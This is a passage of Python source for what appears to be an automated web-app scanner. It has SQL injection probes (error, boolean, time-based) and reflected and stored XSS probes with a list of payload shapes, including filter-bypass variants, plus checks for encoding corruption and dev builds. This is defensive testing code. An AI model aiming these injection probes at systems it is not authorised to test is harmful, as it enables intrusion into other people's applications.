    r"gateway time-?out|bad gateway|\bupstream\b|\b\w*api (?:error|\d{3}|rate|key|quota)|"
    r"too many requests|rate.?limit(?:ed|ing)?|quota exceeded", re.I)


_DEEP_SLOTS = 6  # UNION + time are expensive/blind -> run them on at most this many slots


def api_sqli(ctx, probe) -> bool | None:
    """SQL injection across the discovered surface (OpenAPI + mined API paths + HTML GET forms, with
    common-param guessing on param-less searchable GETs). Per injectable slot, tries error-, boolean-,
    UNION-, and time-based detection — one flaw, one finding. N/A when no injectable GET/POST target
    exists; the SQL-error / stability / double-timing guards keep a parameterized app clean."""
    targets = [e for e in _sqli_targets(ctx.profile)
               if e.method.lower() in ("get", "post") and _sqli_slots(e)]
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 120)
    capped = _request_capped(probe)   # actual-request ceiling: each slot runs error+boolean (2-4 reqs), so bound
    #                                   the total (a real SQLi short-circuits early; the class collapses to 1 finding)
    delay = probe.probe.get("time_delay", 3)
    tested = False
    slots_tested = 0
    eps_tested: list = []
    deep: list = []  # slots deferred to the UNION/time (blind, last-resort) pass
    techs = ["error", "boolean"]   # SCORED. time is advisory/off-score; union is cut (causal-specificity)
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=max(15.0, delay * 3 + 8),
                     follow_redirects=False) as c:
        for ep in targets:
            if capped():
                break
            method = ep.method.upper()
            try:
                base = _do(c, method, _sqli_request(ep, None, _SQLI_BENIGN))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _redirects_to_auth(base):
                continue  # login-gated target -> not testable without a session; skip (don't fuzz the redirect)
            if _SQL_ERROR.search(base.text):
                continue  # baseline already errors for unrelated reasons -> can't attribute injection
            if _UPSTREAM_ERROR.search(base.text):
                continue  # proxies a third-party API -> latency/output track the upstream, not a DB (confounded)
            if not _endpoint_is_live(ctx, c, ep.raw_path, method, base):
                continue  # phantom endpoint (root or per-prefix catch-all shell) -> not a real SQL sink
            eps_tested.append(ep.raw_path)
            if budget <= 0:
                break
            # DETERMINISTIC error + boolean per slot: both are pure CONTENT differentials (no latency), so the
            # slots fan out concurrently and stop on the first confirmed injection. The blind TIME technique is
            # NOT here -- it stays in the sequential `deep` pass below, where concurrent requests can't confound
            # the latency it measures. A no-hit endpoint's slots are deferred to that time pass (advisory).
            slots = list(_sqli_slots(ep))[:budget]
            budget -= len(slots)
            if slots:
                tested = True
                slots_tested += len(slots)

                def _sqli_send(slot, ep=ep, method=method):
                    reqfn = lambda v: _sqli_request(ep, slot, v)
                    try:
                        err, err_pay = _tech_error(c, method, reqfn)
                        if err or _tech_boolean(c, method, reqfn):
                            return slot, {"via": "error" if err else "boolean", "err": err,
                                          "pay": err_pay if err else _SQLI_TRUE, "reqfn": reqfn,
                                          "method": method, "path": ep.raw_path}
                    except (httpx.HTTPError, httpx.InvalidURL):
                        return slot, None
                    return slot, None
                got = _fan_out_first(_sqli_send, slots, lambda s, r: r is not None, cap_check=capped)
                if got is not None:
                    slot, info = got
                    ctx.evidence.update(injectable=True, via=info["via"], param=slot, endpoint=info["path"],
                                        sql_error=info["err"], techniques_tried=techs,
                                        repro=_sqli_repro(ctx, info["method"], info["reqfn"], info["pay"],
                                                          matched=info["err"]))
                    return True
                for slot in slots:   # no deterministic hit -> defer these to the blind TIME pass (advisory, off-score)
                    if len(deep) < _DEEP_SLOTS:
                        deep.append((method, (lambda v, ep=ep, slot=slot: _sqli_request(ep, slot, v)),
                                     ep.raw_path, slot))
            if capped():
                break
        for method, reqfn, path, slot in deep:   # blind TIME pass -> ADVISORY only, never scored
            if capped():
                break
            try:
                if _tech_time(c, method, reqfn, delay):
                    ctx.evidence.setdefault("advisory", "possible blind sqli (time-based, unverified — human review)")
                    ctx.evidence.setdefault("advisory_param", slot)
                    ctx.evidence.setdefault("advisory_endpoint", path)
                    ctx.evidence.setdefault("advisory_repro",
                                            _sqli_repro(ctx, method, reqfn, _TIME_PAYLOADS[0].format(d=delay)))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    ctx.evidence.update(injectable=False, endpoints_tested=len(eps_tested),
                        params_tested=slots_tested, techniques_tried=techs)
    return False if tested else None


def _injectable_targets(profile):
    """(action, method, field_names) over the injectable input surface — HTML forms (GET + POST) and
    reflecting/searchable query GETs — shared by the reflection/injection probes (XSS, command
    injection, path traversal)."""
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in profile.forms if f.fields]
    q_eps = [(e.raw_path, "get", list(e.query_params)) for e in profile.endpoints
             if e.method.lower() == "get" and e.query_params]
    s_eps = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in profile.endpoints
             if e.method.lower() == "get" and not e.query_params and not e.path_params
             and _SEARCHABLE.search(e.raw_path)]
    return forms + q_eps + s_eps


def _json_body_targets(profile):
    """(path, "postjson", body_field_names) over POST/PUT/PATCH JSON-API endpoints — the SPA injectable
    surface the form/query enumeration (_injectable_targets) misses. The "postjson" sentinel routes
    _xss_send / _elapsed / _form_repro to a JSON body. Consumed by the SUBSTRING-oracle injection probes
    (command_injection / ssti_injectable / path_traversal), whose arithmetic-result / file-signature markers
    are content-type-agnostic; NOT xss_injectable (a JSON echo isn't executable HTML — _reflects requires it)
    or http_response_splitting (a header sink). Uses the concretized path ({id}->1), not the raw template."""
    return [(e.path, "postjson", list(e.body_fields)) for e in profile.endpoints
            if e.method.lower() in ("post", "put", "patch") and e.body_fields]


# Reflected + stored XSS — comprehensive technique coverage of one flaw ("this input is echoed into
# HTML unescaped"), collapsing to a single finding. Each payload targets a different reflection context;
# detection is verbatim, unescaped reflection of a UNIQUE per-run marker (an escaping app encodes the
# `<`/`"` -> the detect string never appears -> clean). The browser dom_xss probe covers execution.
def _xss_payloads(m: str):
    """(inject, detect) per technique — `detect` appears only if `inject` reflects unescaped."""
    return [
        ("<script>%s</script>" % m, "<script>%s</script>" % m),            # script tag in HTML body
        ("<img src=x onerror=%s>" % m, "<img src=x onerror=%s>" % m),      # <img> event handler
        ("<svg onload=%s>" % m, "<svg onload=%s>" % m),                    # <svg> event handler
        ('<a href="javascript:%s">x</a>' % m, 'href="javascript:%s"' % m), # javascript: URI
        ('"><svg onload=%s>' % m, "<svg onload=%s>" % m),                  # break out of an attribute value
        ('" onmouseover=%s x="' % m, '" onmouseover=%s' % m),              # attribute event injection (no <)
        ("</script><svg onload=%s>" % m, "<svg onload=%s>" % m),           # break out of a <script> block
        ("<ScRiPt>%s</ScRiPt>" % m, "<ScRiPt>%s</ScRiPt>" % m),            # case-varied tag (filter bypass)
    ]


_XSS_FILLER = "hlxfill"  # benign value for the fields we're not currently injecting


def _xss_send(c, method, action, data):
    if method == "postjson":
        return c.request("POST", action, json=data)   # JSON API body — the SPA injectable surface
    if (method or "get").lower() == "get":
        return c.request("GET", action, params=data)
    return c.request("POST", action, data=data)  # HTML form -> form-encoded body


def _reflects(resp, detect: str) -> bool:
    """The payload reflects unescaped, into an HTML response, in an EXECUTABLE position — not merely present.
    Two guards against a non-executable echo: (1) content-type must be HTML (a JSON API body echoing the payload
    isn't rendered as HTML); (2) the matched occurrence must not be BACKSLASH-ESCAPED — a `\\"` means the marker
    sits inside serialized JSON data embedded in the HTML (Next.js RSC / __PAGE__ flight, <script type=json>),
    where the escaped quote can't break an attribute (verified: mekong-watch reflected `" onmouseover` into
    __PAGE__ flight data, not real HTML)."""
    if "html" not in resp.headers.get("content-type", "").lower():
        return False
    text = resp.text
    i = text.find(detect)
    while i >= 0:
        if i == 0 or text[i - 1] != "\\":   # un-escaped occurrence -> a real executable reflection
            return True
        i = text.find(detect, i + 1)          # escaped (JSON/JS string) -> keep looking for an executable one
    return False


def xss_injectable(ctx, probe) -> bool | None:
    """Reflected + stored XSS across discovered forms and reflecting query params. A cheap server-side
    pre-filter (does the field echo a unique marker unescaped into HTML?) narrows the surface; a GET
    reflection is then CONFIRMED BY EXECUTION in a headless browser (the payload actually runs), not by
    string-presence — the research-backed fix that kills the Next.js RSC/JSON flight-data FP class (a
    payload present-but-inert in serialized data never executes). POST/stored (and the no-browser mode)
    fall back to the hardened unescaped-reflection heuristic. N/A when there's no HTML input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    m = "hlx" + secrets.token_hex(4)
    payloads = _xss_payloads(m)
    budget = probe.probe.get("max_attempts", 150)
    browser_ok = ctx.profile.capabilities.get("browser", False)
    tested = False
    checked = 0
    get_candidates: list[tuple[str, str]] = []   # (action, field) GET reflections to confirm by execution
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                checked += 1
                # Cheap gate: does this field echo the marker into an HTML response at all? If not, no
                # reflected XSS is possible here -> skip. Keeps breadth across every form affordable.
                try:
                    probe_resp = _xss_send(c, method, action, {fn: (m if fn == field else _XSS_FILLER) for fn in fields})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if not _reflects(probe_resp, m):
                    continue
                if method == "get" and browser_ok:
                    get_candidates.append((action, field))   # defer to execution confirmation (below)
                    continue
                # POST, or no-browser GET: hardened server-side payload-shape reflection (the fallback)
                for inject, detect in payloads:
                    if budget <= 0:
                        break
                    budget -= 1
                    data = {fn: (inject if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        rr = _xss_send(c, method, action, data)
                        if _reflects(rr, detect):
                            ctx.evidence.update(injectable=True, kind="reflected", via="reflection",
                                                target=action, field=field, payload=inject,
                                                repro=_repro_from_resp(rr, matched="unescaped reflection of " + inject[:60]))
                            return True  # reflected unescaped in an HTML (executable) context -> XSS
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
            if budget <= 0:
                break
            # STORED: submit a script payload, then re-fetch the page — persisted reflection = stored XSS
            if method == "post" and budget > 0:
                budget -= 1
                inject, detect = payloads[0]
                try:
                    sent = _xss_send(c, "post", action, {fn: inject for fn in fields})
                    if _reflects(c.get(action), detect):
                        ctx.evidence.update(injectable=True, kind="stored", stored=True, via="reflection",
                                            target=action, payload=inject,
                                            repro=_repro_from_resp(sent, matched="payload persists; GET %s reflects it" % action))
                        return True  # persisted across a fresh request -> stored XSS
                except (httpx.HTTPError, httpx.InvalidURL):
                    pass
    # CONFIRM GET reflections by EXECUTION, not string-presence: a param that reflects the marker but whose
    # payload never RUNS in a real browser is inert (framework-escaped / RSC-flight data — the FP class).
    # Group by action so one browser launch covers all of that page's reflecting fields.
    if get_candidates and browser_ok:
        by_action: dict[str, list[str]] = {}
        for action, field in get_candidates:
            by_action.setdefault(action, []).append(field)
        for action, gfields in by_action.items():
            if browser.dom_xss_executes(ctx.base_url, [action], params=tuple(gfields),
                                        payloads=browser._XSS_EXEC_PAYLOADS, headers=ctx.headers):
                exurl = ctx.base_url.rstrip("/") + action + "?" + urllib.parse.urlencode({gfields[0]: browser._XSS_PAYLOAD})
                ctx.evidence.update(injectable=True, kind="reflected", execution_confirmed=True, via="execution",
                                    target=action, fields=gfields,   # executed in a real DOM -> provable XSS
                                    repro=_repro("GET", exurl, matched="payload executed in a headless browser"))
                return True
    ctx.evidence.update(injectable=False, fields_tested=checked, payload_shapes=len(payloads),
                        get_candidates_unconfirmed=len(get_candidates))
    return False if tested else None


# --- qa-input-002: international / multibyte input robustness ------------------------------------------------
# Submit real-world non-ASCII text (emoji, CJK, Arabic, combining marks, full-width, astral-plane) to a writable
# field and watch the round trip. Two failure modes a MEANINGFUL fraction of apps ship (a MySQL `utf8` 3-byte
# column, a latin1 table, a form-charset mismatch, a naive byte-slice): the value comes back CORRUPTED (mojibake
# / replacement char / `?` substitution) -> data silently mangled (32); or the request 500s -> the app crashes on
# real user data (72). Intent-independent + deterministic: a UTF-8-clean stack round-trips every string untouched.
_ENC_PROBES = [
    ("emoji", "\U0001F468‍\U0001F469‍\U0001F467\U0001F9D1\U0001F3FD"),  # ZWJ family + skin tone: 4-byte utf8mb4
    ("cjk", "日本語한국어中文"),          # JP/KR/CN (breaks a latin1 table)
    ("arabic", "مرحبا"),          # RTL Arabic
    ("fullwidth", "ＡＢＣ１２"),       # full-width double-byte forms (3-byte)
    ("astral", "\U0001D54F\U0001F004\U0001D7D9"),          # astral-plane 4-byte (math + mahjong)
]
# every probe char is > U+00FF, so a surviving char never collides with the U+00C0-U+00FF mojibake signature.
_MOJIBAKE_LEAD = tuple(chr(c) for c in range(0xC0, 0x100))  # utf-8 lead bytes (0xC2-0xF4) as latin-1


def _encoding_corrupted(text: str, sentinel: str, expected: str):
    """Did our non-ASCII value come back mangled? True (corrupted) / False (survived) / None (can't judge -- not
    reflected, or ambiguous). Locates the ASCII sentinel, isolates the reflected value up to the next structural
    delimiter, and decodes HTML entities (so `&#26085;` counts as CORRECT handling, not corruption). Fires only on
    a POSITIVE loss marker -- a U+FFFD replacement char, a `?` substitution, or utf-8-as-latin-1 mojibake (a
    U+00C0-U+00FF lead-byte run) where our (all > U+00FF) chars were -- never on mere absence (%-encoding, a JSON
    \\u escape, a value the app didn't echo), which would false-positive."""
    i = text.find(sentinel)
    if i < 0:
        return None                                        # value not reflected -> this probe can't judge round-trip
    raw = text[i + len(sentinel): i + len(sentinel) + max(64, len(expected) * 8)]
    cut = len(raw)
    for d in ('"', "<", "\n", "\r", "'", "}", "\\"):       # the reflected value ends at the first HTML/JSON delimiter
        j = raw.find(d)
        if 0 <= j < cut:
            cut = j
    window = raw[:cut]
    if not window:
        return None                                        # value stripped / not echoed after the sentinel -> abstain
    decoded = html.unescape(window)
    if any(ch in decoded for ch in expected):
        return False                                       # any expected char survived (raw or entity-encoded) -> clean
    if "�" in window:
        return True                                        # U+FFFD replacement char -> definitive loss
    if "?" in window:
        return True                                        # `?` where our multibyte chars were -> charset substitution
    if any(ch in window for ch in _MOJIBAKE_LEAD):
        return True                                        # utf-8-as-latin-1 mojibake (double-encoding)
    return None                                            # reflected but ambiguous (stripped / %-encoded) -> abstain


def _submit_and_observe(c, method, action, fields, field, sentinel, value):
    """Submit `value` in `field` and return (observed_text, status) -- the text where the sentinel round-trips:
    the POST/GET response itself (an echoing endpoint), ELSE a READ-BACK GET of the endpoint (a REST create that
    returns {id} but whose listing shows the stored value -- the SPA-sink recall lane). observed_text is None
    when the value isn't observable anywhere; status is the submit status (for the 5xx check)."""
    try:
        rr = _xss_send(c, method, action, {fn: (value if fn == field else "hl") for fn in fields})
    except (httpx.HTTPError, httpx.InvalidURL):
        return None, None
    if sentinel in rr.text:
        return rr.text, rr.status_code
    if (method or "get").lower() in ("post", "postjson", "put", "patch"):
        try:
            rb = c.request("GET", action.split("?")[0])          # read the value back from the endpoint/listing
            if sentinel in rb.text:
                return rb.text, rr.status_code
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
    return None, rr.status_code


def international_input_breaks(ctx, probe) -> bool | None:
    """qa-input-002: the app corrupts (32) or 500s (72) on international / multibyte input. Baselines each field
    with an ASCII marker first, so a generally-broken endpoint is never blamed on encoding, and only credits the
    500 rung when ASCII returns 2xx but the unicode payload 5xxs. Observes the round trip via the response echo
    OR a READ-BACK GET (a JSON create that doesn't echo but whose listing shows the value -- the SPA sink).
    Uses the register-lane session (reach fields behind login). N/A when there's no writable text surface."""
    targets = _injectable_targets(ctx.profile) + _json_body_targets(ctx.profile)
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 60)
    tested = False
    corrupted_hit = None
    # OBSERVABILITY instrumentation: a "clean" is only meaningful if we actually SAW a round trip. Count the
    # observable denominator (echo OR read-back) so a genuine clean (survived intact) is distinguishable from a
    # vacuous one (nothing observable). Drives the tail-vs-recall read.
    fields_tested = fields_reflecting = survived = abstained = 0
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                sentinel = "HLenc" + secrets.token_hex(3)
                # BASELINE: an ASCII value must round-trip 2xx first, else this endpoint is broken regardless of
                # encoding (a 500 on ascii, a dead route) -> skip; never blame encoding for a generally-broken field.
                btext, bstatus = _submit_and_observe(c, method, action, fields, field, sentinel, sentinel)
                if bstatus is None or bstatus >= 500:
                    continue
                tested = True
                fields_tested += 1
                observable = btext is not None                   # echo OR read-back showed the value
                if observable:
                    fields_reflecting += 1
                for script, payload in _ENC_PROBES:
                    if budget <= 0:
                        break
                    budget -= 1
                    ptext, pstatus = _submit_and_observe(c, method, action, fields, field, sentinel, sentinel + payload)
                    if pstatus is not None and pstatus >= 500:   # ASCII was fine (baseline<500) -> the unicode 500s it
                        ctx.evidence.update(broke=True, server_error=True, kind="500", script=script,
                                            target=action, field=field, status=pstatus,
                                            fields_tested=fields_tested, fields_reflecting=fields_reflecting,
                                            repro=_repro("POST", ctx.base_url.rstrip("/") + action,
                                                         matched="HTTP %d on %s input" % (pstatus, script)))
                        return True                              # the 72 rung: crashes on real user data
                    if observable and ptext is not None:
                        verdict = _encoding_corrupted(ptext, sentinel, payload)
                        if verdict is True and corrupted_hit is None:
                            corrupted_hit = (action, field, script)
                        elif verdict is False:
                            survived += 1                        # international chars came back intact
                        elif verdict is None:
                            abstained += 1                       # observed but couldn't judge (%-encoded / JSON \u)
            if budget <= 0:
                break
    obs = dict(fields_tested=fields_tested, fields_reflecting=fields_reflecting, survived=survived, abstained=abstained)
    if corrupted_hit is not None:                            # the 32 rung: value silently mangled on round trip
        action, field, script = corrupted_hit
        ctx.evidence.update(broke=True, corrupted=True, kind="corruption", script=script, target=action, field=field,
                            **obs,
                            repro=_repro("POST", ctx.base_url.rstrip("/") + action,
                                         matched="%s input round-tripped corrupted (mojibake / ? / U+FFFD)" % script))
        return True
    if survived > 0:
        ctx.evidence.update(broke=False, **obs)
        return False                                         # observed >=1 international round trip survive -> clean
    # BROWSER READ-BACK lane: httpx saw no round trip (an SPA JSON sink / client-rendered create), so drive a
    # content form in a browser (carrying the session), submit an international value, re-render, and read it back
    # from the CLIENT-RENDERED DOM -- the SPA write round trip httpx structurally can't observe. One launch, the
    # most fragile payload (4-byte emoji: if it survives, the narrower scripts do too). Gated on a real browser.
    if getattr(ctx, "profile", None) is not None and ctx.profile.capabilities.get("browser"):
        script, payload = _ENC_PROBES[0]                     # emoji (4-byte utf8mb4 -> breaks a 3-byte utf8 column)
        sentinel = "HLenc" + secrets.token_hex(3)
        try:
            rendered = browser.create_and_read_back(ctx.base_url, sentinel + payload, sentinel,
                                                    headers=_authed_headers(ctx))
        except Exception:
            rendered = None
        if rendered is not None:
            obs["fields_reflecting"] = obs.get("fields_reflecting", 0) + 1
            verdict = _encoding_corrupted(rendered, sentinel, payload)
            if verdict is True:                              # the 32 rung, observed via the browser read-back
                ctx.evidence.update(broke=True, corrupted=True, kind="corruption", script=script, via="browser",
                                    target="(browser create)", **obs,
                                    repro=_repro("POST", ctx.base_url,
                                                 matched="%s round-tripped corrupted via browser read-back" % script))
                return True
            if verdict is False:
                ctx.evidence.update(broke=False, via="browser", **obs)
                return False                                 # observed a CLEAN browser round trip -> handles unicode
    ctx.evidence.update(broke=False, **obs)
    # tested fields, but none reflected their value (SPA JSON sink / non-echoing form) -> we never SAW a round
    # trip, so a "clean" here would be false. Honest N/A: the recall gap the browser read-back lane closes.
    ctx.evidence["na_reason"] = (
        "no observable international round-trip (%d field(s) tested, none reflected the value)" % fields_tested
        if tested else "no writable text surface to test")
    return None


def stored_xss_api(ctx, probe) -> bool | None:
    """Stored XSS via a JSON API + client render — the SPA sink xss_injectable (reflection into an HTML
    response) and dom_xss (URL-param sink) both miss. POST an EXECUTING payload into a create endpoint's body
    field(s), then RENDER the app in a browser and fire if it EXECUTES: the stored value was reflected
    UNESCAPED into the DOM and ran. Provable (browser execution, not mere storage) + intent-independent (an
    app that escapes on output — React {value} — never fires). The text analog of upload-002 (stored XSS via
    file). N/A without a JSON create endpoint, a browser, or (when the create is gated) a session."""
    creates = [e for e in ctx.profile.endpoints if e.method.lower() in ("post", "put", "patch") and e.body_fields]

    def _browser_create_fallback():
        """When the httpx create can't store (auth-gated, or the SPA form action is a placeholder so the real
        create is a JS fetch), drive the create IN THE BROWSER with the session and check execution on the
        re-render. Only ever CONFIRMS execution (True) -> never a false clean/fire; None = couldn't confirm."""
        if not (getattr(ctx, "profile", None) is not None and ctx.profile.capabilities.get("browser")):
            return None
        marker = "hlsx" + secrets.token_hex(3)
        xss = "<img src=x onerror=\"window.__hl_domxss='%s'\">" % marker
        try:
            if browser.create_and_check_execution(ctx.base_url, xss, marker, headers=_authed_headers(ctx)):
                ctx.evidence.update(stored_xss=True, stored=True, execution_confirmed=True, via="browser-create")
                return True
        except Exception:
            pass
        return None

    if not creates:
        if _browser_create_fallback():                     # no JSON create endpoint, but maybe a browser content form
            return True
        ctx.evidence["na_reason"] = "no JSON create endpoint to store an XSS payload through"
        return None
    account = ctx.register()   # the create is usually auth-gated; a provided --header/--login session is used directly
    client = account.client if account is not None else make_client(ctx.base_url, ctx.headers,
                                                                     timeout=10.0, follow_redirects=True)
    payload = browser._XSS_PAYLOAD
    stored = False
    try:
        for e in creates:
            try:
                r = client.post(e.path, json={f: payload for f in e.body_fields})   # payload in every field
                if r.status_code in (200, 201):
                    stored = True
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
        if not stored:
            if _browser_create_fallback():                 # httpx couldn't POST (auth-gated / JS-fetch create) -> browser
                return True
            ctx.evidence["na_reason"] = "no create accepted the stored-XSS write to render back"
            return None
        hdrs = dict(ctx.headers or {})   # render as the SAME identity so the stored item is on the authed feed
        if account is not None and not account.provided:
            cookie = "; ".join("%s=%s" % (c.name, c.value) for c in account.client.cookies.jar)
            if cookie:
                hdrs["Cookie"] = cookie
            authz = account.client.headers.get("Authorization")
            if authz:
                hdrs["Authorization"] = authz
        routes = [r for r in ctx.profile.routes
                  if not r.startswith("/_next/") and not r.split("?")[0].endswith((".js", ".css", ".png",
                                                                                    ".svg", ".ico", ".woff2"))][:20] or ["/"]
        if browser.stored_xss_executes(ctx.base_url, routes, headers=hdrs or None):
            ctx.evidence.update(stored_xss=True, stored=True, execution_confirmed=True, endpoints=[e.path for e in creates][:5])
            return True   # a stored API value executed unescaped in the DOM -> stored XSS
        ctx.evidence.update(stored_xss=False, creates_tested=len(creates))
        return False
    finally:
        client.close()


def back_nav_broken(ctx, probe) -> bool | None:
    """Broken back button (UI-state honesty): after an in-app navigation, the browser BACK button doesn't
    restore the prior view — the SPA router hijacked history without a pushState. Binary, intent-independent
    (no app wants a dead back button), needs no create flow, applies to nearly any SPA with in-app links.
    N/A without a browser or an in-app route link to exercise."""
    verdict, detail = browser.back_button_broken(ctx.base_url, headers=ctx.headers)
    if verdict == "broken":
        ctx.evidence.update(back_broken=True, **detail)   # nav_link + entry/after-click/after-back URLs -> auditable
        return True   # BACK did not restore the entry view -> broken history handling
    if verdict == "ok":
        ctx.evidence.update(back_broken=False, **detail)
        return False
    ctx.evidence["na_reason"] = "no in-app navigation to test (single-view app / no router link / no browser)"
    return None


_SCRIPT_SRC = re.compile(r"""<script\b[^>]*\bsrc=["']([^"']+)["']""", re.I)
# dev-server / HMR / build-tool script references that a prod deploy shouldn't have. Their absence (404) does
# NOT stop the app rendering, so they are not a "dead bundle" -- unlike the app's real hashed bundle.
_DEV_SCRIPT = re.compile(r"livereload|/@vite/|/@react-refresh|hot-update|webpack-dev-server|__vite|/@id/|"
                         r"\.local\.js\b|/node_modules/", re.I)


def _registrable(netloc: str) -> str:
    """The registrable domain (last two labels ~ eTLD+1) of a netloc, so an apex<->www canonical redirect reads
    as the SAME site (foo.com == www.foo.com) while a move to a DIFFERENT domain does not (basementhost.com !=
    tensordock.com). IPs and single-label hosts compare whole (port stripped)."""
    h = (netloc or "").split(":")[0].lower().rstrip(".")
    if re.match(r"^\d+(?:\.\d+)*$", h) or len(h.split(".")) < 3:
        return h                          # IPv4 / apex domain / single label -> compare the whole host
    return ".".join(h.split(".")[-2:])    # www.foo.com / a.b.foo.com -> foo.com


# DEVELOPMENT BUILD SHIPPED TO PRODUCTION — the HMR client is the categorical tell.
#
# Hot Module Replacement exists to swap one module while a developer edits files: the dev server injects a
# client that holds a WebSocket open and waits for pushes. It is meaningless in a deployment — nobody is
# editing, the socket retries forever against a server that will never speak — and it is INCOMPATIBLE with a
# production build, because HMR needs modules kept separate and addressable while bundling fuses, tree-shakes
# and mangles them. Bundlers therefore strip the dev branches statically (Vite replaces `import.meta.hot`,
# webpack `module.hot`), so these markers CANNOT survive a production build even when the guard is in source.
# That is what makes this categorical rather than heuristic: presence proves the artifact was produced in dev
# mode. No legitimate deployed app ships one.
#
# SCOPE, deliberately narrow (option (a)): source maps are NOT a signal here even though they are a dev-build
# tell, because sec-exposure-006 already prices a served .map at 15 in the security bundle and its claim (your
# source is reconstructable) is the right one. Charging the same .map twice for one root cause is exactly the
# double-count variant groups exist to prevent. This probe also lives in QA rather than PERFORMANCE for the
# same reason: a dev build is unminified and unbundled, so perf-weight-001 already prices the size and
# perf-cwv-* the render cost. The residual claim left to make is neither "slow" nor "readable" but "you
# shipped the wrong artifact", which is deployment hygiene.
_HMR_CLIENT_SRC = re.compile(r"/@vite/client|/@react-refresh|sockjs-node|webpack-dev-server"
                             r"|webpack/hot/|__webpack_hmr|react-refresh/runtime", re.I)
# Runtime markers that only the dev transform emits, matched inside FETCHED JAVASCRIPT (never raw page text —
# see below).
_HMR_RUNTIME = re.compile(r"\$RefreshReg\$|\$RefreshSig\$|__vite_ping|vite:beforeUpdate"
                          r"|__webpack_hmr|webpackHotUpdate", re.I)
# Corroboration only, never a fire on its own: dev servers are chatty in ways prod builds usually are not, but
# every one of these appears on plenty of production stacks too.
_DEV_HEADER = re.compile(r"webpack-dev-server|vite|next\.js dev|werkzeug|flask development", re.I)


def development_build_served(ctx, probe) -> bool | None:
    """The deployment is running a DEV BUILD: an HMR client is being served. Categorical — bundlers strip HMR
    statically, so it cannot survive a production build. Header signature is recorded as corroboration but
    never fires alone. N/A when the landing page serves no same-origin script to inspect.

    PRECISION: matched in SCRIPT CONTEXT ONLY — a <script src> pointing at an HMR client path, or the runtime
    markers inside fetched same-origin JavaScript. Deliberately NOT matched against raw page text, because a
    tutorial, changelog or docs page that merely MENTIONS `/@vite/client` in a code block would otherwise fire.
    That is the obvious false-positive vector for a string-matching probe and hackathon submissions include
    plenty of project write-ups."""
    path = _home_path(ctx, probe)
    host = urllib.parse.urlparse(ctx.base_url).netloc
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        try:
            r = c.get(path)
        except (httpx.HTTPError, httpx.InvalidURL):
            ctx.evidence["na_reason"] = "landing page could not be fetched"
            return None
        html = r.text
        hdr = " ".join("%s: %s" % (k, v) for k, v in r.headers.items()
                       if k.lower() in ("server", "x-powered-by"))
        dev_header = bool(_DEV_HEADER.search(hdr))
        srcs = [s.strip() for s in _SCRIPT_SRC.findall(html)]
        if not srcs:
            ctx.evidence["na_reason"] = "landing page references no script to inspect"
            return None
        # 1) the dev client requested BY NAME in a script tag -> categorical, no fetch needed.
        # SAME-ORIGIN ONLY, same rule as the bundle check below: a CDN-hosted react-refresh belongs to
        # whoever runs the CDN, and firing on it would attribute someone else's script to this submission.
        # (Caught by this probe's own precision test, which fired on an esm.sh-style URL.)
        for s in srcs:
            su = urllib.parse.urlparse(urllib.parse.urljoin(ctx.base_url.rstrip("/") + path, s))
            if su.netloc and su.netloc != host:
                continue
            if _HMR_CLIENT_SRC.search(s):
                ctx.evidence.update(dev_build=True, signal="hmr-client-script", script=s[:120],
                                    dev_header=dev_header, header=hdr[:120],
                                    repro=_repro_from_resp(r, matched="served HTML requests the HMR client %s"
                                                                     % s[:60]))
                return True
        # 2) else look for the dev-only transform markers INSIDE the app's own JavaScript
        checked = 0
        for s in srcs[:12]:
            pu = urllib.parse.urlparse(urllib.parse.urljoin(ctx.base_url.rstrip("/") + path, s))
            if pu.netloc and pu.netloc != host:
                continue                                   # a CDN/vendor script is not the app's build
            try:
                # KEEP THE QUERY. `?v=<hash>` is not decoration on a dev server — Vite serves pre-bundled deps
                # as /node_modules/.vite/deps/react.js?v=1a2b3c and cache-busted prod assets use the same shape.
                # Fetching the bare path can 404 (leaving `checked` at 0, so the probe reports N/A instead of
                # inspecting the bundle) or return a DIFFERENT artifact than the page actually loaded. Same bug
                # already fixed once in _page_weight, where dropping the query deduped distinct assets into one.
                js = c.get(pu.path + ("?" + pu.query if pu.query else ""))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if "javascript" not in (js.headers.get("content-type", "") or "").lower():
                continue                                   # an SPA shell served where JS should be
            checked += 1
            m = _HMR_RUNTIME.search(js.text[:400_000])
            if m:
                ctx.evidence.update(dev_build=True, signal="hmr-runtime-in-bundle", marker=m.group(0),
                                    script=pu.path[:120], dev_header=dev_header, header=hdr[:120],
                                    repro=_repro_from_resp(js, matched="app bundle carries the dev-only HMR "
                                                                       "runtime marker %s" % m.group(0)))
                return True
        if not checked:
            ctx.evidence["na_reason"] = "no same-origin JavaScript could be inspected"
            return None
        ctx.evidence.update(dev_build=False, scripts_checked=checked, dev_header=dev_header)
        return False


def dead_bundle_chunk(ctx, probe) -> bool | None:
    """Stale/dead bundle chunk (UI-state honesty, a hard-fail): the served HTML references a JS bundle URL
    that no longer resolves — cached HTML pointing at a PREVIOUS deploy's bundle hash — so the app literally
    cannot render. Parse <script src> from '/', request each SAME-ORIGIN script, and fire on any that 404s OR
    (on a catch-all/SPA host that never 404s) is served the HTML shell instead of JavaScript. N/A when the
    served HTML references no same-origin script bundle."""
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        try:
            html = c.get("/").text
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
        host = urllib.parse.urlparse(ctx.base_url).netloc
